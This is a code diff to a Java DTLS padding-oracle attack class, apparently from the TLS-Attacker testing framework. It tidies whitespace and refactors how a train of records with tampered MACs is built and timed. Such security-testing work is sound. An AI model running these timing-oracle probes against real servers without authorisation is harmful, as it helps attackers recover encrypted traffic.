@@ -137,7 +137,6 @@ public class DtlsPaddingOracleAttackTest extends Attacker<DtlsPaddingOracleAttac
 	byte[][] invalidPaddingTrain = createInvalidPaddingMessageTrain(config.getMessagesPerTrain(), roundMessageData);
 	byte[][] invalidMacTrain = createInvalidMacMessageTrain(config.getMessagesPerTrain(), roundMessageData);
 	long[] results = new long[2];
-        
 
 	for (byte[] record : invalidPaddingTrain) {
 	    transportHandler.sendData(record);
@@ -151,7 +150,6 @@ public class DtlsPaddingOracleAttackTest extends Attacker<DtlsPaddingOracleAttac
 	long endNanos = System.nanoTime();
 	results[0] = endNanos - startNanos;
 
-        
 	for (byte[] record : invalidMacTrain) {
 	    transportHandler.sendData(record);
 	}
@@ -163,8 +161,7 @@ public class DtlsPaddingOracleAttackTest extends Attacker<DtlsPaddingOracleAttac
 	}
 	endNanos = System.nanoTime();
 	results[1] = endNanos - startNanos;
-        
-        
+
 	return results;
     }
 
@@ -196,19 +193,20 @@ public class DtlsPaddingOracleAttackTest extends Attacker<DtlsPaddingOracleAttac
     private byte[][] createInvalidMacMessageTrain(int n, byte[] messageData) {
 	byte[][] train = new byte[n + 1][];
 	List<de.rub.nds.tlsattacker.tls.record.messages.Record> records = new ArrayList<>();
-	Record record;
 	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
 	protocolMessages.add(apMessage);
 	apMessage.setData(messageData);
 
+	Record record = new Record();
+	record.setMac(modifiedMacArray);
+	records.add(record);
+	byte[] recordBytes = recordHandler.wrapData(messageData, ProtocolMessageType.APPLICATION_DATA, records);
+
 	for (int i = 0; i < n; i++) {
-	    record = new Record();
-	    record.setMac(modifiedMacArray);
-	    records.add(record);
-	    train[i] = recordHandler.wrapData(messageData, ProtocolMessageType.APPLICATION_DATA, records);
-	    records.remove(0);
+	    train[i] = recordBytes;
 	}
 
+	records.remove(0);
 	records.add(new Record());
 	HeartbeatMessage hbMessage = new HeartbeatMessage();
 	protocolMessages.add(hbMessage);
